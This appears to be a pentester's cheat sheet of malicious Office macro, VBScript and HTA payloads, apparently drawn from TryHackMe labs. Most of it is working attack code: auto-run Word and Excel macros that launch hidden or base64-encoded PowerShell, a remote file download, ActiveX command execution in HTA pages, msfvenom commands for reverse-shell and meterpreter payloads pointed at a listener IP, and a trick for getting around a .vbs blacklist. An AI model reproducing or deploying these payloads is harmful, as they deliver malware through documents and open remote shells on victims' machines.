# Useful Visual Basic for Applications

Beware these uses for VBA, if you find code like this on your computer tell a member of IT. I don't how you got here, unless you have good ethical hacking reasons in which case enjoy true horror of VBA scripts, as many as I find and explain their cool use cases.

#  VB script shell:
```vb
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\cmd.exe " & WScript.ScriptFullName),0,True
```
If .vbs is blacklisted run using wscript /e:VBScript with a rename to script.txt 

# Visual Basic 4 Apps 

### Word Macro shell:
```vb
Sub PoC()
	Dim payload As String
	payload = "cmd.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

### HTML application:

Also known as HTA, these are dynamic html pages host with a python3 -m http.sever 1337
```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```


OR
```bash
reverse shell with netcat
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
```
OR 
```bash
metasploit: msfconsole -q
use exploit/windows/misc/hta_server
```

### Excel HTA

Excel HTA macro from THM Throwback

```vb
Sub HelloWorld()
    PID = Shell("powershell.exe -c Invoke-WebRequest -Uri https://ip/passwd -OutFile C:\passwd", vbNormalFocus)
End Sub

Sub Auto_Open()
    HelloWorld
End Sub
```

### Metasploit VBA

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba
```

# Encoded Payloads

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e base64encoded"
    Str = Str + "base64encodepayloadappendstrequalstring"
  	...
	Str = Str + "endofthebase64=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```